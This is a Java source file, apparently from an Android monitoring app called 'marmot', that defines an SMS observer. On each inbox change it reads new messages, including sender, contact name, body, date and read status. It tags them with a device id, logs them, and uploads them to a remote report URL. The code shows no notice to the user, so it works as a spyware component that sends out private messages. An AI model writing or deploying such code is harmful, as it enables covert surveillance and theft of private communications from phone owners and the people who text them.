/**
 * 
 */
package com.domker.marmot.watcher.sms;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Handler;

import com.android.volley.Response.Listener;
import com.domker.marmot.config.ConfigManager;
import com.domker.marmot.log.MLog;
import com.domker.marmot.net.ResponseResult;
import com.domker.marmot.net.Urls;
import com.domker.marmot.net.WatcherNet;
import com.domker.marmot.net.WatcherRequest;
import com.domker.marmot.watcher.WatcherContentObserver;

/**
 * 短信数据库监听器
 * 
 * @author Maison
 *
 */
public class SmsObserver extends WatcherContentObserver {
	
	/**
	 * @param handler
	 */
	public SmsObserver(Context context, Handler handler) {
		super(context, handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		updateSmsFromPhone();
	}
	
	/**
	 * 从数据库中读取短信内容
	 */
	private void updateSmsFromPhone() {
		ContentResolver cr = mContext.getContentResolver();
		ConfigManager config = ConfigManager.getInstance();
		String where = " date > " + config.getSmsTime();
		Cursor cur = cr.query(SmsWatcher.SMS_INBOX, null, where, null, "date desc");
		if (cur == null) {
			return;
		}
		MLog.i("Begin UpdateSmsFromPhone");
		List<SmsEntity> smsList = new ArrayList<SmsEntity>();
		String uid = config.getUid();
		while (cur.moveToNext()) {
			SmsEntity sms = parserSms(cur);
			// 处理业务
			if (sms != null) {
				sms.uid = uid;
				smsList.add(sms);
				MLog.i("sms", sms.toString());
			}
		}
		MLog.i("End UpdateSmsFromPhone");
		cur.close();
		postRequest(smsList);
	}
	
	/**
	 * 读取短信内容
	 * 
	 * @param c
	 */
	private SmsEntity parserSms(Cursor c) {
		try {
			MLog.i(Arrays.toString(c.getColumnNames()));
			SmsEntity s = new SmsEntity();
			s.number = c.getString(c.getColumnIndex("address"));// 发件人地址
			s.name = c.getString(c.getColumnIndex("person"));   // 发件人，如果发件人在通讯录中则为具体姓名，陌生人为null
			s.body = c.getString(c.getColumnIndex("body"));
			s.date = c.getLong(c.getColumnIndex("date"));     // date：日期，long型，如1346988516，可以对日期显示格式进行设置
			s.protocol = c.getInt(c.getColumnIndex("protocol")); // protocol：协议0 SMS_RPOTO短信，1 MMS_PROTO彩信
			s.read = c.getInt(c.getColumnIndex("read")); // 是否阅读0未读，1已读
			s.type = c.getInt(c.getColumnIndex("type")); // type：短信类型1是接收到的，2是已发出
			s.serviceCenter = c.getString(c.getColumnIndex("service_center")); // service_center：短信服务中心号码编号，如+8613800755500
			return s;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	/* (non-Javadoc)
	 * @see com.domker.marmot.watcher.WatcherContentObserver#checkChange()
	 */
	@Override
	public void checkChange() {
		updateSmsFromPhone();
	}
	
	private void postRequest(List<SmsEntity> smsList) {
		if (smsList == null || smsList.isEmpty()) {
			return;
		}
		
		Listener<ResponseResult> listener = new Listener<ResponseResult>() {

			@Override
			public void onResponse(ResponseResult result) {
				MLog.i("onResponse", result.toString());
				if (result.isSucceed()) {
					ConfigManager.getInstance().setSmsTime(System.currentTimeMillis());
				}
			}
		};
		WatcherRequest request = WatcherRequest.create(Urls.SMS_REPORT, smsList, listener);
		WatcherNet.getInstance().addRequest(request);
	}
}
